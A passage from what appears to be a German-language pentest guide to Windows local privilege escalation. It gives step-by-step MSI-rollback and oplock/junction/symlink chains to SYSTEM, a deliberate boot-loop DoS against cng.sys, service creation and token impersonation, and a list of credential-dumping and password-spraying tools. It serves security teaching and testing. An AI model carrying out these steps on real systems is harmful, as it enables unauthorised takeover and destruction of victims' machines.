    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte ein Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere die `.msi` erneut mit:
        - `TARGETDIR`: Beschreibbarer Speicherort.
        - `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` einliest.

- Schritt 8: Auf `.rbs` überwachen
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wurde.
        - Dann wartet, bevor es weitergeht.

- Schritt 10: Schwache ACL erneut anwenden
    - Nach Erhalt des Ereignisses `.rbs created`:
        - Wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du aber weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **die schwachen ACLs erneut anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, sodass du weiterhin in den Ordner schreiben kannst.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` mit einer **bösartigen SYSTEM-Level-Payload-DLL** ab.

- Schritt 12: Rollback auslösen
    - Signalisiere das Synchronisierungsereignis, damit der Installer fortfährt.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch wird das **Rollback gestartet**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - Liest deine bösartige `.rbs`.
        - Kopiert deine `.rbf`-DLL an den Zielort.
    - Jetzt befindet sich deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** aus (z. B. `osk.exe`), die die von dir gehijackte DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Datei-Löschen/Verschieben/Umbenennen zu SYSTEM-EoP

Die Haupttechnik mit MSI-Rollback (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Aber was, wenn deine Schwachstelle nur das **beliebige Löschen von Dateien** erlaubt?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen versteckten alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Indexmetadaten** des Ordners.

Wenn du also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschst**, **entfernt** NTFS den gesamten Ordner aus dem Dateisystem.

Dazu kannst du standardmäßige APIs zum Löschen von Dateien verwenden, wie z. B.:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine *Datei*-Lösch-API aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen von Ordnerinhalten zur SYSTEM-EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen der *Inhalte* eines vom Angreifer kontrollierten Ordners ermöglicht**?

1. Schritt 1: Einen Köderordner und eine Datei einrichten
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalt zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen Callback übergeben.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream, in dem Ordner-Metadaten gespeichert sind – wird er gelöscht, wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Aufgrund der Junction + des Symlinks wird jetzt jedoch tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von beliebiger Ordnererstellung zu permanentem DoS

Nutze eine Primitive aus, mit der du **als SYSTEM/Admin einen beliebigen Ordner erstellen kannst** – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen kannst**.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn du **ihn vorab als Ordner erstellst**, kann Windows beim Booten den eigentlichen Treiber nicht laden.
- Anschließend versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht finden** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externes Eingreifen (z. B. Bootreparatur oder Datenträgerzugriff).

### Von privilegierten Log-/Backup-Pfaden und OM-Symlinks zum beliebigen Überschreiben von Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte an einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, kannst du diesen Pfad mit **Object-Manager-Symlinks + NTFS-Mountpoints** umleiten und so den privilegierten Schreibvorgang in ein beliebiges Überschreiben von Dateien verwandeln (auch **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration mit dem Zielpfad ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mountpoint auf `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lies die Konfiguration aus, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. wenn ein Administrator „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` vorhanden ist, kann zuerst versucht werden, diese zu laden. Damit eignet sie sich zuverlässig als DoS-Ziel für beschädigte Daten.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem Prozess mit High Integrity ausführst, kann der **Weg zu SYSTEM** einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen einer Service-Binärdatei darauf, dass sie ein gültiger Service ist oder die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Von einem Prozess mit hoher Integrität aus kannst du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und mithilfe eines _**.msi**_-Wrappers eine Reverse Shell zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### Hohe Integrität + SeImpersonate-Berechtigung zu System

**Den** [**Code findest du hier**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen

Wenn du über diese Token-Berechtigungen verfügst (wahrscheinlich findest du sie in einem Prozess mit bereits hoher Integrität), kannst du mit der SeDebug-Berechtigung **fast jeden Prozess öffnen** (außer geschützte Prozesse), das **Token** des Prozesses **kopieren** und mit diesem Token einen **beliebigen Prozess erstellen**.\
Bei dieser Technik wird normalerweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Berechtigungen ausgeführt wird** (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Berechtigungen_).\
**Ein** [**Codebeispiel, das die vorgeschlagene Technik ausführt, findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter für die Rechteausweitung mit `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Service erstellt oder missbraucht, um in diese Pipe zu schreiben**. Danach kann der **Server**, der die Pipe mit der **`SeImpersonate`**-Berechtigung erstellt hat, **das Token** des Pipe-Clients (des Service) **impersonieren** und so SYSTEM-Berechtigungen erlangen.\
Wenn du [**mehr über Named Pipes erfahren möchtest, lies dies**](#named-pipe-client-impersonation).\
Ein Beispiel dafür, [**wie du mithilfe von Named Pipes von hoher Integrität zu System gelangst, findest du hier**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn du eine DLL **kapern kannst**, die von einem als **SYSTEM** ausgeführten **Prozess geladen wird**, kannst du mit diesen Berechtigungen beliebigen Code ausführen. Daher ist Dll Hijacking auch für diese Art der Rechteausweitung nützlich. Außerdem ist es **von einem Prozess mit hoher Integrität deutlich einfacher**, da dieser **Schreibberechtigungen** für die zum Laden von DLLs verwendeten Ordner hat.\
**Mehr über Dll Hijacking erfährst du** [**hier**](dll-hijacking/index.html)**.**

### **Von Administrator oder Network Service zu System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollständigen Berechtigungen

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zum Suchen nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und vertraulichen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Verwende lokal -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Zugangsdaten aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt mit gesammelten Passwörtern Password Spraying in der Domäne durch**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-Tool für ADIDNS/LLMNR/mDNS-Spoofing und Man-in-the-Middle-Angriffe.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Enumeration von Windows für Rechteausweitungen**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (VERALTET; Watson wird empfohlen)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Rechteausweitung) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Zugangsdaten aus zahlreichen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sucht nach Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sucht nach möglichen Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (benötigt für die ordnungsgemäße Funktion kein accesschk, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Opfer-Host installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```



## References

- [1] [Grundlagen der Windows-Privilege-Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Privilege Escalation durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Spickzettel](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zu lokaler Privilege Escalation unter Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Anleitung zur Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Checkliste für Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows-Privilege-Escalation-Methoden für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing via SMTP → hMailServer-Anmeldedaten entschlüsseln → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-Leak + Stack-BOF → VirtualAlloc ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf Silver Fox: Katz-und-Maus-Spiel im Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Sicherheitslücke im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ein Link in die Vergangenheit: Missbrauch symbolischer Links unter Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – Herausforderungen der C/C++-Checkliste, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – RtlQueryRegistryValues-Funktion](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: CLDFLT und DirectX-Kernel-Race-Conditions für Windows-LPE verketten](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Ein vollständiges Read/Write-Exploit-Primitive unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen für Privilege Escalation und andere Tricks ausnutzen](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine Windows-10-Local-Privilege-Escalation-1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource Based Constrained Delegation: Wenn eine Image-Änderung zu einer Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – SSH-Private-Keys aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Privilege Escalation durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM nachvollziehen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group – Advisory zur Privilege Escalation durch Shared-Memory-Offsets in Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
